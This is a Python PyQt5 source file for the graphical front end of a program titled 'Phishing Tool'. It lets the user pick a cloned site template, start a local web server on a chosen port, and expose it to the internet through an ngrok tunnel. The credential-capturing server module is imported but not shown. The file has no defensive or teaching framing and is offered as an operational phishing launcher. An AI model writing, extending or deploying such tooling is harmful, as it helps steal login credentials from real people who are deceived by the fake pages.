from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QIntValidator
from PyQt5.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QLabel, QComboBox, QLineEdit, QPushButton, QPlainTextEdit, QGroupBox, QRadioButton, QHBoxLayout, QWidget, QInputDialog, QSizePolicy, QProgressBar
import httpserver
import glob
import os


class ServerThread(QThread):
    started = pyqtSignal(str)
    stopped = pyqtSignal()
    output = pyqtSignal(str)

    def __init__(self, port, ngrok_option, ngrok_auth_token, site):
        super().__init__()
        self.port = port
        self.ngrok_option = ngrok_option
        self.ngrok_auth_token = ngrok_auth_token
        self.site = site

    def run(self):
        self.started.emit(self.site)
        httpserver.phishing_tool_instance = self
        self.server_manager = httpserver.ServerManager()
        self.server_manager.start_server(self.port, self.update_output, self.ngrok_option, self.ngrok_auth_token, self.site)
        self.stopped.emit()

    def stop(self):
        self.server_manager.stop_server()

    def update_output(self, text):
        self.output.emit(text)


class PhishingTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle('Phishing Tool')

        main_layout = QVBoxLayout()

        # Site selection
        self.site_label = QLabel('Site:')
        self.site_combobox = QComboBox()
        sites = self.get_sites()
        for site in sites:
            self.site_combobox.addItem(site)

        # Port input
        self.port_label = QLabel('Port:')
        self.port_input = QLineEdit()
        self.port_input.setValidator(QIntValidator(1, 65535))
        self.port_input.setText('8080')

        # Start and stop buttons
        self.start_button = QPushButton('Start')
        self.start_button.clicked.connect(self.start_phishing)
        self.stop_button = QPushButton('Stop')
        self.stop_button.clicked.connect(self.stop_phishing)

        # Output area
        self.output_label = QLabel('Output:')
        self.output_area = QPlainTextEdit()
        self.output_area.setReadOnly(True)
        self.output_area.setFixedWidth(800)
        self.output_area.setFixedHeight(300)
        self.output_area.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Fixed)
        self.output_area.setStyleSheet("font-size: 14px; font-family: Arial; color: #333333; background-color: #f8f8f8;")
        

        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)

        # Tunneling options
        self.tunneling_options_group = QGroupBox("Tunneling Options")
        self.tunneling_options_layout = QHBoxLayout()

        self.ngrok_option = QRadioButton("Ngrok")
        self.localhost_option = QRadioButton("Localhost")
        self.localhost_option.setChecked(True)
        self.tunneling_options_layout.addWidget(self.localhost_option)
        self.tunneling_options_layout.addWidget(self.ngrok_option)
        self.tunneling_options_group.setLayout(self.tunneling_options_layout)

        # Adding components to main layout
        main_layout.addWidget(self.site_label)
        main_layout.addWidget(self.site_combobox)
        main_layout.addWidget(self.port_label)
        main_layout.addWidget(self.port_input)
        main_layout.addWidget(self.tunneling_options_group)
        main_layout.addWidget(self.start_button)
        main_layout.addWidget(self.stop_button)
        main_layout.addWidget(self.output_label)
        main_layout.addWidget(self.output_area)
        main_layout.addWidget(self.progress_bar)

        central_widget = QWidget()
        central_widget.setLayout(main_layout)
        self.setCentralWidget(central_widget)

        self.server_thread = None

    def start_phishing(self):
        if self.server_thread and self.server_thread.isRunning():
            self.output_area.appendPlainText(" [ - ] Server is already running.")
            return

        site = self.site_combobox.currentText()
        port = self.port_input.text()
        ngrok_option = self.ngrok_option.isChecked()
        ngrok_auth_token = None
        if ngrok_option:
            ngrok_auth_token, _ = QInputDialog.getText(self, "Ngrok Auth Token", "Enter your ngrok authentication token:")

        self.server_thread = ServerThread(port, ngrok_option, ngrok_auth_token, site)
        self.server_thread.started.connect(self.on_server_started)
        self.server_thread.stopped.connect(self.on_server_stopped)
        self.server_thread.output.connect(self.on_server_output)

        self.lock_input(True)
        self.progress_bar.setVisible(True)
        self.progress_bar.setRange(0, 0)

        self.server_thread.start()

    def stop_phishing(self):
        if self.server_thread and self.server_thread.isRunning():
            self.progress_bar.setVisible(True)
            self.progress_bar.setRange(0, 0)
            self.stop_button.setEnabled(False)
            self.server_thread.stop()
        else:
            self.output_area.appendPlainText(" [ - ] No server running.")

    def on_server_started(self, site):
        self.progress_bar.setRange(0, 1)
        self.progress_bar.setValue(1)
        self.progress_bar.setFormat("Server started on {}.".format(site))
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

    def on_server_stopped(self):
        self.progress_bar.setRange(0, 1)
        self.progress_bar.setValue(1)
        self.progress_bar.setFormat("Server stopped.")
        self.output_area.appendPlainText(" [ - ] Server stopped.")
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.lock_input(False)

    def on_server_output(self, text):
        self.output_area.appendPlainText(text)
        self.output_area.verticalScrollBar().setValue(self.output_area.verticalScrollBar().maximum())

    def lock_input(self, lock):
        self.site_combobox.setEnabled(not lock)
        self.port_input.setEnabled(not lock)
        self.ngrok_option.setEnabled(not lock)
        self.localhost_option.setEnabled(not lock)

    def closeEvent(self, event):
        self.stop_phishing()
        event.accept()

    def get_sites(self):
        site_list = [
            os.path.basename(os.path.dirname(site))
            for site in glob.glob("templates/*/index.html")
        ]
        return site_list
    
